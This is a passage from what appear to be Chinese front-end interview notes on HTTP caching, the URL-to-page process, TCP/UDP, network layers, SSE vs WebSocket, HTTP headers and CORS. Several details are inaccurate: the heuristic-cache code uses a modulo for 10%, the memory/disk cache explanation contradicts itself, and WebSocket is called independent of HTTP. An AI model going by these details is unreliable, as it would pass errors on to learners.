<strong>在优先级上，服务器校验优先考虑Etag。</strong></p></blockquote><p>用户行为对强缓存和协商缓存的影响</p><table><thead><tr><th>用户操作</th><th>Expires&#x2F;cache-control</th><th>Last-modified&#x2F;Etag</th></tr></thead><tbody><tr><td>地址栏回车 页面链接跳转 新开窗口 前进、后退</td><td>有效</td><td>有效</td></tr><tr><td>F5刷新</td><td>无效</td><td>有效</td></tr><tr><td>Ctrl + F5刷新（强制刷新）</td><td>无效</td><td>无效</td></tr></tbody></table><h5 id="启发式缓存"><a href="#启发式缓存" class="headerlink" title="启发式缓存"></a>启发式缓存</h5><blockquote><p>MDN解释: 对于含有特定头信息的请求，会去计算缓存寿命。比如<code>Cache-control: max-age=N</code>的头，相应的缓存的寿命就是<code>N</code>。通常情况下，对于不含这个属性的请求则会去查看是否包含<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires">Expires</a>属性，通过比较Expires的值和头里面<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Date">Date</a>属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的<a href="https://link.juejin.cn/?target=https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified">Last-Modified</a>信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%）</p></blockquote><p>简而言之，只有在没有明确缓存策略时，会激活启发式缓存。所以要合理设置缓存，否则会因没有设置缓存时间等原因，导致内容缓存不刷新。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// Date 减去 Last-Modified 值的 10% 作为缓存时间。</span><br><span class="hljs-comment">// Date：创建报文的日期时间, Last-Modified 服务器声明文档最后被修改时间</span><br>  response_is_fresh = (<span class="hljs-title class_">Date</span> -  <span class="hljs-title class_">Last</span>-<span class="hljs-title class_">Modified</span>) % <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><hr><h5 id="附："><a href="#附：" class="headerlink" title="附："></a>附：</h5><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4f03d57d77d74f15bb47bf3aa4c865f8~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><h5 id="一、设置不缓存的方法"><a href="#一、设置不缓存的方法" class="headerlink" title="一、设置不缓存的方法"></a>一、设置不缓存的方法</h5><ol><li>html文件设置meta；</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;meta http-equiv=<span class="hljs-string">&quot;pragma&quot;</span> content=<span class="hljs-string">&quot;no-cache&quot;</span>&gt; <br>&lt;meta http-equiv=&quot;Cache-Control&quot; content=&quot;no-cache, must-revalidate&quot;&gt; <br>&lt;meta http-equiv=&quot;expires&quot; content=&quot;Wed, 26 Feb 1997 00:00:00 GMT&quot;&gt;<br></code></pre></td></tr></table></figure><ol><li>服务端响应添加<code>Cache-Control:no-cache,must-revalidate</code>指令；</li><li>修改请求头<code>If-modified-since:0</code>或<code>If-none-match</code>；</li><li>请求url后增加时间戳；</li><li>服务端设置Cache-Control:private指令，防止代理服务器缓存资源</li></ol><h5 id="二、-为什么同一个资源有时是from-memory-cache有时是from-disk-cache？"><a href="#二、-为什么同一个资源有时是from-memory-cache有时是from-disk-cache？" class="headerlink" title="二、 为什么同一个资源有时是from memory cache有时是from disk cache？"></a><strong>二、 为什么同一个资源有时是from memory cache有时是from disk cache？</strong></h5><p>Chrome会根据本地内存的使用率来决定缓存存放在哪，如果内存使用率很高，放在磁盘里面，内存的使用率很高会暂时放在内存里面</p><h5 id="三、Cache-Control-max-age-x3D-0-和-no-cache有什么不同？"><a href="#三、Cache-Control-max-age-x3D-0-和-no-cache有什么不同？" class="headerlink" title="三、Cache-Control: max-age&#x3D;0 和 no-cache有什么不同？"></a>三、<strong>Cache-Control: max-age&#x3D;0 和 no-cache有什么不同？</strong></h5><p><code>max-age=0</code>和<code>no-cache</code>应该是从语气上不同。<code>max-age=0</code>是告诉客户端资源的缓存到期<strong>应该</strong>向服务器验证缓存的有效性。而<code>no-cache</code>则告诉客户端使用缓存前<strong>必须</strong>向服务器验证缓存的有效性。</p><h5 id="缓存在http各个版本的应用"><a href="#缓存在http各个版本的应用" class="headerlink" title="缓存在http各个版本的应用"></a>缓存在http各个版本的应用</h5><p>HTTP 协议的不同版本（包括 HTTP&#x2F;1.0、HTTP&#x2F;1.1、HTTP&#x2F;2 和 HTTP&#x2F;3）都支持缓存，但它们在缓存的作用和机制上有一些不同。以下是各个版本的 HTTP 缓存作用和机制的简要概述：</p><h5 id="HTTP-x2F-1-0"><a href="#HTTP-x2F-1-0" class="headerlink" title="HTTP&#x2F;1.0:"></a>HTTP&#x2F;1.0:</h5><ol><li><p><strong>Expires 头字段：</strong> HTTP&#x2F;1.0 使用 <code>Expires</code> 头字段来指定响应的过期时间。浏览器在接收到响应后，将会将其缓存，并在过期时间内直接使用缓存，而不必再次请求服务器。</p></li><li><p><strong>Last-Modified 和 If-Modified-Since 头字段：</strong> 如果服务器响应包含 <code>Last-Modified</code> 头字段，浏览器将在下一次请求时发送 <code>If-Modified-Since</code> 头字段，询问服务器资源是否在上次修改后发生了变化。如果服务器返回状态码 304（未修改），浏览器将使用缓存。</p></li></ol><h5 id="HTTP-x2F-1-1"><a href="#HTTP-x2F-1-1" class="headerlink" title="HTTP&#x2F;1.1:"></a>HTTP&#x2F;1.1:</h5><ol><li><p><strong>Cache-Control 头字段：</strong> HTTP&#x2F;1.1 引入了更强大的缓存控制机制，通过 <code>Cache-Control</code> 头字段可以指定缓存策略，例如 <code>max-age</code> 表示缓存的最大有效时间。这允许更灵活地控制缓存。</p></li><li><p><strong>ETag 和 If-None-Match 头字段：</strong> 服务器可以为资源生成唯一的 <code>ETag</code>（实体标签），浏览器在下一次请求时将发送 <code>If-None-Match</code> 头字段，询问服务器资源是否发生了变化。如果服务器返回状态码 304，浏览器将使用缓存。</p></li></ol><h5 id="HTTP-x2F-2"><a href="#HTTP-x2F-2" class="headerlink" title="HTTP&#x2F;2:"></a>HTTP&#x2F;2:</h5><p>HTTP&#x2F;2 使用了与 HTTP&#x2F;1.1 相似的缓存机制，但由于其多路复用特性，多个请求可以通过单个连接并行发送和接收，因此它可以更有效地利用缓存。</p><h5 id="HTTP-x2F-3"><a href="#HTTP-x2F-3" class="headerlink" title="HTTP&#x2F;3:"></a>HTTP&#x2F;3:</h5><p>HTTP&#x2F;3 是基于 QUIC 协议的，与 HTTP&#x2F;2 类似，它也支持多路复用。HTTP&#x2F;3 引入了一些性能优化，但在缓存机制方面与 HTTP&#x2F;2 类似。</p><p>总体来说，不同版本的 HTTP 协议都支持缓存，但 HTTP&#x2F;1.1 引入了更多的缓存控制选项，使缓存更加灵活。而 HTTP&#x2F;2 和 HTTP&#x2F;3 在多路复用方面具有优势，可以更有效地利用缓存来提高性能。缓存是提高 Web 性能的关键因素之一，合理配置缓存策略可以减少不必要的网络请求，降低页面加载时间。</p><h3 id="x3D-x3D-4、从输入url到看到页面的过程-x3D-x3D"><a href="#x3D-x3D-4、从输入url到看到页面的过程-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;4、从输入url到看到页面的过程&#x3D;&#x3D;"></a>&#x3D;&#x3D;4、从输入url到看到页面的过程&#x3D;&#x3D;</h3><p>将 URL 转化为页面的过程涉及多个步骤，其中包括 DNS 解析、建立 TCP 连接、进行 HTTPS 安全握手、发送 HTTP 请求、接收响应、渲染页面等等。以下是详细的步骤：</p><ol><li><p><strong>DNS 解析（Domain Name System）：</strong></p><ul><li>当用户在浏览器中输入一个 URL，浏览器首先需要将域名部分解析为对应的 IP 地址。</li><li>浏览器首先检查本地 DNS 缓存，如果找到了对应的 IP 地址，就会直接使用它，否则继续下一步。</li><li>如果本地缓存中没有记录，浏览器会向本地 DNS 服务器发送 DNS 查询请求，以获取域名对应的 IP 地址。</li><li>如果本地 DNS 服务器也没有缓存，它会向更高级别的 DNS 服务器发起查询请求，直至找到域名的 IP 地址，然后将结果返回给浏览器。</li></ul></li><li><p><strong>建立 TCP 连接（Transmission Control Protocol）：</strong></p><ul><li>一旦浏览器获取到目标服务器的 IP 地址，它需要建立一个 TCP 连接以与服务器通信。</li><li>浏览器会创建一个 TCP 套接字，包括源 IP、源端口、目标 IP 和目标端口，然后发起三次握手（SYN、SYN-ACK、ACK）来建立连接。</li><li>一旦连接建立成功，浏览器和服务器之间可以进行双向通信。</li></ul></li><li><p><strong>进行 HTTPS 安全握手：</strong></p><ul><li>如果目标页面是通过 HTTPS 访问的，浏览器会在建立 TCP 连接后执行 TLS&#x2F;SSL 安全握手。</li><li>安全握手过程包括服务器证书验证、生成加密密钥、验证服务器身份等步骤，以确保通信的安全性和完整性。</li></ul></li><li><p><strong>发送 HTTP 请求：</strong></p><ul><li>一旦安全握手完成，浏览器会构建一个 HTTP 请求报文，包括请求方法（GET、POST 等）、请求头、请求体等。</li><li>请求报文被封装成 TCP 包，并通过 TCP 连接发送到服务器。</li></ul></li><li><p><strong>服务器处理请求：</strong></p><ul><li>服务器接收到 HTTP 请求后，会解析请求报文，并根据请求的路径和参数执行相应的操作。</li><li>服务器会处理请求，并生成一个 HTTP 响应报文，包括状态码、响应头、响应体等。</li></ul></li><li><p><strong>接收 HTTP 响应：</strong></p><ul><li>浏览器在接收到服务器的 HTTP 响应后，会解析响应报文。</li><li>如果响应状态码为 200（OK），浏览器会继续处理响应内容。否则，它会根据状态码执行相应的错误处理。</li></ul></li><li><p><strong>渲染页面：</strong></p><ul><li>如果响应内容是 HTML 页面，浏览器会开始解析 HTML，并构建 DOM（文档对象模型）树。</li><li>浏览器会下载页面所需的外部资源，如 CSS、JavaScript、图片等，并并行处理它们。</li><li>浏览器根据 DOM 树和 CSS 样式计算出页面的布局，然后将页面渲染到屏幕上。</li><li>JavaScript 代码可以修改 DOM 和样式，实现交互和动态效果。</li></ul></li><li><p><strong>执行 JavaScript：</strong></p><ul><li>如果页面包含 JavaScript，浏览器会执行 JavaScript 代码，处理事件、数据请求、页面交互等。</li><li>JavaScript 可以通过 DOM 操作修改页面内容，与服务器进行 AJAX 请求，以及处理用户输入等。</li></ul></li><li><p><strong>事件处理和用户交互：</strong></p><ul><li>浏览器会监听用户的交互事件，如点击、输入、滚动等。</li><li>当用户与页面交互时，浏览器会触发相应的事件处理函数，执行相应的操作。</li></ul></li></ol><p>以上是将 URL转化为页面的主要步骤。整个过程包括网络通信、安全性验证、资源下载、页面渲染、JavaScript 执行等多个环节，它们共同构成了在浏览器中访问网页的复杂过程。</p><h3 id="5、完整说说tcp过程"><a href="#5、完整说说tcp过程" class="headerlink" title="5、完整说说tcp过程"></a>5、完整说说tcp过程</h3><p>TCP（Transmission Control Protocol）是一种可靠的、面向连接的协议，用于在计算机之间传输数据。以下是 TCP 过程的简要概述：</p><ol><li><p><strong>建立连接（三次握手）：</strong></p><p>a. 客户端向服务器发送一个 SYN（同步）包，表示请求建立连接。</p><p>b. 服务器收到 SYN 包后，回复一个 SYN-ACK 包，表示确认请求，并准备好建立连接。</p><p>c. 客户端收到 SYN-ACK 包后，回复一个 ACK 包，表示连接已建立。</p><p>这个过程称为三次握手，它确保了客户端和服务器之间的双向通信通道已经建立。</p></li><li><p><strong>数据传输：</strong></p><p>一旦连接建立，客户端和服务器可以相互传输数据。数据被分成小的数据包，每个数据包都带有序列号，以确保数据的顺序和完整性。</p></li><li><p><strong>流量控制和拥塞控制：</strong></p><p>TCP 使用流量控制和拥塞控制来管理数据的传输。流量控制确保接收方能够处理发送方发送的数据，而拥塞控制通过监控网络拥塞情况并调整发送速率来避免网络过载。</p></li><li><p><strong>关闭连接（四次挥手）：</strong></p><p>a. 客户端向服务器发送一个 FIN（结束）包，表示客户端不再发送数据。</p><p>b. 服务器收到 FIN 包后，发送一个 ACK 包，确认接收到 FIN 包。</p><p>c. 服务器通知应用程序数据已传输完毕，应用程序关闭连接。</p><p>d. 服务器向客户端发送一个 FIN 包，表示服务器也不再发送数据。</p><p>e. 客户端收到 FIN 包后，发送一个 ACK 包，确认接收到 FIN 包。</p><p>f. 客户端通知应用程序数据已传输完毕，应用程序关闭连接。</p><p>这个过程称为四次挥手，它确保连接能够安全地关闭，双方都知道不再传输数据。</p></li></ol><p>TCP 过程是可靠的，确保了数据的可靠传输和顺序传递。它还包括错误检测和纠正机制，以处理数据包的丢失和损坏。这使得 TCP 成为互联网上最常用的传输协议之一，用于可靠地传输 Web 页面、电子邮件、文件传输等各种应用。</p><h3 id="6、计网7层协议，5层协议"><a href="#6、计网7层协议，5层协议" class="headerlink" title="6、计网7层协议，5层协议"></a>6、计网7层协议，5层协议</h3><p>计算机网络体系结构通常分为两种模型，一种是七层协议模型（OSI 模型），另一种是五层协议模型（TCP&#x2F;IP 模型）。下面分别介绍这两种模型：</p><p><strong>OSI 模型（七层协议模型）：</strong></p><ol><li><p><strong>物理层（Physical Layer）：</strong> 负责传输比特流，处理硬件层面的信号传输，如电压、电流、物理介质等。</p></li><li><p><strong>数据链路层（Data Link Layer）：</strong> 负责数据帧的传输和识别，提供物理层的数据传输可靠性，通常包括 MAC 地址（硬件地址）的管理。</p></li><li><p><strong>网络层（Network Layer）：</strong> 负责数据包的路由和转发，实现不同子网之间的通信，使用 IP 协议。</p></li><li><p><strong>传输层（Transport Layer）：</strong> 负责端到端的通信，提供端口号、数据包的分段和重组，常见协议有 TCP 和 UDP。</p></li><li><p><strong>会话层（Session Layer）：</strong> 管理会话的建立、维护和终止，提供数据传输的同步和检测。</p></li><li><p><strong>表示层（Presentation Layer）：</strong> 数据的格式化、加密、压缩和解压缩，确保数据能够被正确解释。</p></li><li><p><strong>应用层（Application Layer）：</strong> 提供应用程序与网络通信的接口，包括 HTTP、FTP、SMTP 等应用协议。</p></li></ol><p><strong>TCP&#x2F;IP 模型（五层协议模型）：</strong></p><ol><li><p><strong>物理层（Physical Layer）：</strong> 与 OSI 模型的物理层相同，负责硬件传输。</p></li><li><p><strong>数据链路层（Data Link Layer）：</strong> 与 OSI 模型的数据链路层和部分网络层功能相结合，包括网络接口卡、以太网、ARP（地址解析协议）等。</p></li><li><p><strong>网络层（Network Layer）：</strong> 与 OSI 模型的网络层相同，负责数据包的路由和转发，包括 IP 协议。</p></li><li><p><strong>传输层（Transport Layer）：</strong> 与 OSI 模型的传输层相同，负责端到端的通信，包括 TCP 和 UDP 协议。</p></li><li><p><strong>应用层（Application Layer）：</strong> 将 OSI 模型的会话层、表示层和应用层合并为一个应用层，负责提供应用程序与网络通信的接口，包括 HTTP、FTP、SMTP 等应用协议。</p></li></ol><p>需要注意的是，虽然 OSI 模型和 TCP&#x2F;IP 模型在层次结构上稍有不同，但它们都是用于描述计算机网络通信的模型，用于帮助理解和组织网络协议。实际上，在实际网络中，更常用的是 TCP&#x2F;IP 模型，因为它更符合互联网的实际工作方式。</p><h3 id="7、TCP和UDP的区别"><a href="#7、TCP和UDP的区别" class="headerlink" title="7、TCP和UDP的区别"></a>7、TCP和UDP的区别</h3><p>TCP（Transmission Control Protocol）和UDP（User Datagram Protocol）是两种不同的传输层协议，它们在数据传输时有一些重要的区别。以下是它们之间的主要区别：</p><ol><li><p><strong>连接性质：</strong></p><ul><li><strong>TCP：</strong> TCP是一种面向连接的协议。在数据传输之前，它需要建立一个连接，以确保数据可靠地传输。连接建立后，数据按顺序和可靠地传输，如果数据包丢失或损坏，TCP会重新传输。</li><li><strong>UDP：</strong> UDP是一种无连接的协议。它不需要在发送数据之前建立连接，也不保证数据的可靠性。UDP发送数据后，不会进行重新传输，因此数据包可能会丢失或到达顺序可能会变化。</li></ul></li><li><p><strong>可靠性：</strong></p><ul><li><strong>TCP：</strong> TCP提供可靠的数据传输。它使用序号、确认和超时等机制来确保数据的完整性和顺序，如果数据包丢失或损坏，TCP会重新传输它们，直到接收方确认接收。</li><li><strong>UDP：</strong> UDP不提供可靠性保证。它发送数据后不会等待确认，也不进行重新传输。这使得UDP更适合那些可以容忍一些数据丢失的应用，如实时音频和视频传输。</li></ul></li><li><p><strong>流量控制：</strong></p><ul><li><strong>TCP：</strong> TCP具有流量控制机制，它可以自动调整数据传输的速度，以适应网络的带宽和拥塞情况。这有助于避免过多的数据拥堵网络。</li><li><strong>UDP：</strong> UDP没有内置的流量控制机制，因此它可能会导致过多的数据包被发送到网络中，可能会引发拥塞。</li></ul></li><li><p><strong>数据包头部开销：</strong></p><ul><li><strong>TCP：</strong> TCP头部相对较大，包含许多控制信息，这增加了每个数据包的开销。</li><li><strong>UDP：</strong> UDP头部相对较小，只包含基本的源端口、目标端口、数据长度和校验和等信息，因此UDP数据包的开销较小。</li></ul></li><li><p><strong>适用场景：</strong></p><ul><li><strong>TCP：</strong> 适用于需要可靠性和有序性的应用，如网页浏览、电子邮件、文件传输等。</li><li><strong>UDP：</strong> 适用于实时性要求高、能够容忍一些数据丢失的应用，如音频&#x2F;视频流媒体、在线游戏、VoIP通信等。</li></ul></li></ol><p>总之，TCP和UDP是两种不同的传输层协议，它们适用于不同类型的应用场景。TCP提供可靠的、有序的数据传输，适合那些对数据完整性和可靠性要求高的应用。而UDP提供了更低的开销和更高的实时性，适合那些对传输延迟要求高的实时应用。选择使用哪种协议取决于应用程序的需求和性能要求。</p><h3 id="8、http2-0服务端给客户端推资源sse，这个特性和-websokit-有啥区别"><a href="#8、http2-0服务端给客户端推资源sse，这个特性和-websokit-有啥区别" class="headerlink" title="8、http2.0服务端给客户端推资源sse，这个特性和 websokit 有啥区别"></a>8、http2.0服务端给客户端推资源sse，这个特性和 websokit 有啥区别</h3><p>HTTP&#x2F;2.0服务器推送（Server Push）、Server-Sent Events (SSE) 和 WebSocket 都是用于实现实时通信的技术，但它们在用途和工作原理上有很大的区别。</p><ol><li><p><strong>HTTP&#x2F;2.0服务器推送：</strong></p><ul><li>HTTP&#x2F;2.0服务器推送是一种在客户端请求资源时，服务器可以主动将相关资源推送给客户端的技术。</li><li>它基于HTTP&#x2F;2协议，通过复用单一的TCP连接来提高性能。</li><li>服务器推送通常用于提前将与当前请求相关的资源（如CSS、JavaScript文件等）推送给客户端，以减少页面加载时间。</li><li>服务器推送是一种单向通信，只能从服务器向客户端推送数据，客户端不能向服务器发送消息。</li></ul></li><li><p><strong>Server-Sent Events (SSE)：</strong></p><ul><li>SSE 是一种浏览器向服务器发起的持久性单向通信技术，服务器可以在有新数据时推送数据给客户端。</li><li>SSE 基于标准的HTTP协议，使用EventSource API来建立连接和接收服务器推送的事件。</li><li>SSE 主要用于实现服务器向客户端的单向通信，例如实时通知、实时更新等场景。</li><li>SSE 是基于文本的，通常用于传输文本数据，不适用于传输二进制数据。</li></ul></li><li><p><strong>WebSocket：</strong></p><ul><li>WebSocket 是一种全双工的双向通信技术，它允许客户端和服务器之间建立持久性连接，双方可以随时发送消息。</li><li>WebSocket 使用独立的协议，不依赖于HTTP，因此它可以在HTTP和HTTPS之外的端口上运行。</li><li>WebSocket 适用于需要实时双向通信的应用，如在线聊天、在线游戏、协作工具等。</li><li>WebSocket 可以传输文本和二进制数据，非常灵活。</li></ul></li></ol><p>综上所述，HTTP&#x2F;2.0服务器推送主要用于提前推送与当前请求相关的资源以加速页面加载，是一种单向通信；SSE 用于服务器向客户端的单向实时通信，而 WebSocket 允许建立双向通信通道，适用于更广泛的实时通信需求。选择哪种技术取决于具体的应用场景和需求。</p><h3 id="9、http的标头"><a href="#9、http的标头" class="headerlink" title="9、http的标头"></a>9、http的标头</h3><p>HTTP（Hypertext Transfer Protocol）标头是包含在HTTP请求和响应中的元数据信息，用于描述请求或响应的各个方面。HTTP标头提供了有关数据的重要信息，例如内容类型、日期、服务器信息、身份验证等等。以下是常见的HTTP标头：</p><p><strong>HTTP请求标头：</strong></p><ol><li><p><strong>Host：</strong> 指定目标服务器的主机名和端口号。必须包含在HTTP&#x2F;1.1请求中。</p></li><li><p><strong>User-Agent：</strong> 发起请求的用户代理（浏览器、爬虫、应用程序等）的标识信息。</p></li><li><p><strong>Accept：</strong> 指定客户端可接受的响应内容类型，通常是MIME类型。</p></li><li><p><strong>Content-Type：</strong> 指定请求主体的媒体类型，用于POST请求等。</p></li><li><p><strong>Authorization：</strong> 包含用于身份验证的凭据信息，例如基本身份验证或令牌。</p></li><li><p><strong>Cookie：</strong> 包含客户端与服务器之间的会话信息，用于跟踪用户状态。</p></li><li><p><strong>Referer（Referer）：</strong> 指示引用当前请求的URL，通常用于追踪链接来源。</p></li><li><p><strong>If-Modified-Since：</strong> 指定资源的最后修改日期，用于条件性GET请求，如果未修改则返回304状态码。</p></li><li><p><strong>Cache-Control：</strong> 控制缓存行为，例如max-age、no-cache、private等。</p></li></ol><p><strong>HTTP响应标头：</strong></p><ol><li><p><strong>Status Code：</strong> 表示响应的状态码，例如200 OK、404 Not Found、500 Internal Server Error等。</p></li><li><p><strong>Content-Type：</strong> 指定响应主体的媒体类型，用于告知客户端如何解释响应数据。</p></li><li><p><strong>Content-Length：</strong> 指示响应主体的字节数。</p></li><li><p><strong>Server：</strong> 表示服务器的信息，通常包含服务器名称和版本号。</p></li><li><p><strong>Set-Cookie：</strong> 用于在客户端中设置新的或更新现有的Cookie。</p></li><li><p><strong>Location：</strong> 用于重定向响应，指示客户端应该访问的新URL。</p></li><li><p><strong>WWW-Authenticate：</strong> 用于要求客户端提供身份验证凭据。</p></li><li><p><strong>Last-Modified：</strong> 指示资源的最后修改日期和时间，用于缓存控制。</p></li><li><p><strong>ETag：</strong> 用于标识资源的版本，用于条件性请求。</p></li></ol><p>这只是HTTP标头的一小部分，HTTP协议支持许多其他标头，每个标头都用于不同的目的。标头在HTTP通信中起着关键作用，帮助客户端和服务器协调请求和响应的处理。标头的正确使用可以提高性能、安全性和功能性，因此在编写Web应用程序或API时，理解和使用HTTP标头是非常重要的。</p><h2 id="浏览器特性篇"><a href="#浏览器特性篇" class="headerlink" title="浏览器特性篇"></a>浏览器特性篇</h2><h3 id="x3D-x3D-1、浏览器的同源策略-x3D-x3D"><a href="#x3D-x3D-1、浏览器的同源策略-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;1、浏览器的同源策略&#x3D;&#x3D;"></a>&#x3D;&#x3D;1、浏览器的同源策略&#x3D;&#x3D;</h3><p>跨域（Cross-Origin）是指在浏览器中，一个网页的运行环境（origin）试图去请求另一个网页的资源，但这两个网页的”origin”（协议、域名、端口）不相同。跨域是由浏览器的同源策略（Same-Origin Policy）所引发的安全限制，目的是保护用户的隐私和安全，防止恶意网站访问用户的敏感数据。</p><p>以下是一些跨域情况的示例：</p><ol><li><p><strong>不同域名</strong>：例如，一个网页试图从<code>https://example.com</code>请求资源，但资源在<code>https://api.example2.com</code>上。</p></li><li><p><strong>不同子域</strong>：即使是不同子域也被视为不同的域。例如，<code>https://subdomain1.example.com</code>尝试请求<code>https://subdomain2.example.com</code>上的资源。</p></li><li><p><strong>不同协议</strong>：使用不同的协议也会被认为是跨域。例如，<code>http://example.com</code>请求<code>https://example.com</code>上的资源。</p></li><li><p><strong>不同端口</strong>：不同端口也会导致跨域问题。例如，<code>https://example.com:8080</code>请求<code>https://example.com:3000</code>上的资源。</p></li></ol><p>跨域问题会导致浏览器阻止跨域请求，除非目标服务器明确允许跨域请求。有几种方法可以解决跨域问题：</p><ol><li><p><strong>CORS（跨源资源共享）</strong>：通过在服务器响应中设置CORS头，服务器可以明确允许来自不同源的请求。这是最常用的跨域解决方案。例如，服务器可以设置<code>Access-Control-Allow-Origin</code>头以指定哪些源可以访问资源。</p></li><li><p><strong>JSONP（JSON with Padding）</strong>：JSONP是一种通过动态创建<code>&lt;script&gt;</code>标签来加载JSON数据的方法。由于<code>&lt;script&gt;</code>标签不受同源策略限制，因此它可以用于跨域请求。</p></li><li><p><strong>代理服务器</strong>：在同一域中设置一个代理服务器，然后在代理服务器上发起请求，再将响应传递给浏览器。这样可以绕过同源策略，但需要额外的服务器资源。</p></li><li><p><strong>使用跨域资源共享代理（CORS Proxy）</strong>：一些服务提供了CORS代理，可以通过这些代理来访问跨域资源，然后代理服务器会将资源返回给你的网页。</p></li><li><p><strong>WebSocket</strong>：WebSocket协议不受同源策略限制，可以用于在不同源之间建立双向通信。</p></li></ol><p>同源策略的限制表现在以下方面：</p><ul><li><p><strong>XHR请求限制：</strong> 使用XMLHttpRequest或Fetch API发送的跨源HTTP请求通常会受到同源策略的限制，需要服务器支持CORS（跨源资源共享）来放宽这些限制。</p></li><li><p><strong>Cookie和LocalStorage限制：</strong> Cookie、LocalStorage和SessionStorage等客户端存储数据的机制受到同源策略的限制。一个页面只能访问自己域名下的Cookie和存储数据。</p></li><li><p><strong>DOM限制：</strong> JavaScript代码只能访问与其来源相同的文档对象模型（DOM）元素。这意味着无法通过脚本直接访问来自其他源的页面的DOM元素。</p></li></ul><p>为了实现跨域资源共享，服务器可以通过设置响应头来允许来自其他域的请求，从而绕过同源策略的限制。例如，通过设置<code>Access-Control-Allow-Origin</code>头，服务器可以明确指定哪些域名可以访问其资源。</p><p>尽管同源策略对安全性非常重要，但它在某些情况下也会带来不便。因此，开发人员需要了解如何处理跨域请求，并在需要时使用CORS或JSONP等技术来安全地实现跨域通信。</p><h5 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h5><p>CORS（跨源资源共享，Cross-Origin Resource Sharing）是一种浏览器安全策略，用于控制在不同源（origin）之间的 web 页面是否允许进行跨域请求。同源策略是浏览器的一项重要安全特性，它限制了来自不同源的网页对当前网页的访问，以保护用户的隐私和安全。CORS 为了解决这个限制而被引入。</p><p>以下是关于 CORS 的重要概念和原则：</p><ol><li><p><strong>同源策略（Same-Origin Policy）：</strong> 同源策略是浏览器的一项安全特性，它要求浏览器限制不同源（协议、域名、端口）的网页间的 JavaScript 交互，以防止潜在的安全风险。</p></li><li><p><strong>跨域请求：</strong> 当一个网页从一个域（origin）请求另一个域的资源时，就会发生跨域请求。例如，一个网页在域名 <code>example.com</code> 上运行的 JavaScript 代码请求了 <code>api.exampleapi.com</code> 上的数据。</p></li><li><p><strong>同源请求和跨源请求的区别：</strong> 同源请求是从相同的源发出的请求，而跨源请求是从不同源发出的请求。</p></li><li><p><strong>CORS 头部：</strong> 服务器可以通过设置 CORS 头部来指示浏览器是否允许跨源请求。常见的 CORS 头部包括 <code>Access-Control-Allow-Origin</code>（允许哪些源访问资源）、<code>Access-Control-Allow-Methods</code>（允许的 HTTP 方法）、<code>Access-Control-Allow-Headers</code>（允许的请求头）、<code>Access-Control-Allow-Credentials</code>（是否允许携带凭证）等。</p></li><li><p><strong>简单请求和预检请求：</strong> 浏览器将跨源请求分为简单请求和非简单请求。简单请求满足一定条件，可以直接发送请求，而非简单请求需要进行预检请求（Preflight Request）以获取服务器的许可。</p></li><li><p><strong>凭证（Credentials）：</strong> 当设置了 <code>Access-Control-Allow-Credentials</code> 头部为 <code>true</code> 时，浏览器会允许跨源请求携带凭证（如 cookies 和 HTTP 认证信息）。</p></li></ol><p>CORS 为开发者提供了一种机制，可以在遵循同源策略的同时，实现跨域数据访问。开发者需要在服务器端配置 CORS 头部以允许或拒绝特定来源的请求。在前端，可以使用 XMLHttpRequest 或 Fetch API 发送跨源请求，并通过浏览器的同源策略和 CORS 头部来控制请求的许可。这有助于实现跨域的数据交互，例如从不同的域获取数据或调用 API。</p><h5 id="简单请求，预检请求"><a href="#简单请求，预检请求" class="headerlink" title="简单请求，预检请求"></a>简单请求，预检请求</h5><p>在跨域请求（Cross-Origin Request）中，浏览器会根据请求的类型和头信息将请求分为两种主要类型：简单请求（Simple Request）和预检请求（Preflight Request）。这两种请求类型涉及到跨域资源共享（CORS）机制，用于在浏览器中控制跨域请求的安全性。</p><ol><li><p><strong>简单请求（Simple Request）：</strong></p><p>简单请求是指满足一定条件的跨域请求，它必须同时满足以下条件：</p><ul><li>使用以下 HTTP 方法之一：GET、HEAD、POST。</li><li>请求头信息限定为以下几种：Accept、Accept-Language、Content-Language、Last-Event-ID、Content-Type（仅限于三个值：application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain）。</li><li>请求中不包含任何自定义的头信息。</li></ul><p>简单请求不会触发预检请求，浏览器会直接发送请求到目标服务器，服务器可以进行响应，响应中需要包含正确的 CORS 头信息（例如 <code>Access-Control-Allow-Origin</code>）以允许跨域请求。</p></li><li><p><strong>预检请求（Preflight Request）：</strong></p><p>预检请求是指不符合简单请求条件的跨域请求。如果请求不符合简单请求的条件，浏览器会先发送一个预检请求 OPTIONS（HTTP 方法） 请求到目标服务器，以获取服务器是否支持跨域请求。预检请求包含以下信息：</p><ul><li>HTTP 方法为 OPTIONS。</li><li>在请求头中包含了以下信息：<ul><li>Origin：表示请求的源（域名）。</li><li>Access-Control-Request-Method：表示实际请求将使用的 HTTP 方法。</li><li>Access-Control-Request-Headers：表示实际请求将使用的自定义头信息。</li></ul></li></ul><p>目标服务器收到预检请求后，会检查是否支持该跨域请求。如果支持，服务器会返回带有 CORS 头信息的响应，表明可以进行跨域请求。浏览器接收到服务器的响应后，才会发送实际的跨域请求。</p></li></ol><p>总结：</p><ul><li>简单请求满足一定条件，可以直接发起跨域请求，不需要预检请求。</li><li>预检请求是为了检查服务器是否支持跨域请求，只有在服务器返回允许跨域的响应后，浏览器才会发送实际请求。</li><li>CORS 头信息（例如 <code>Access-Control-Allow-Origin</code>）在响应中扮演了重要的角色，用于控制跨域请求的安全性。</li></ul><h5 id="CORS有时候会发一个option请求，有了解过吗？"><a 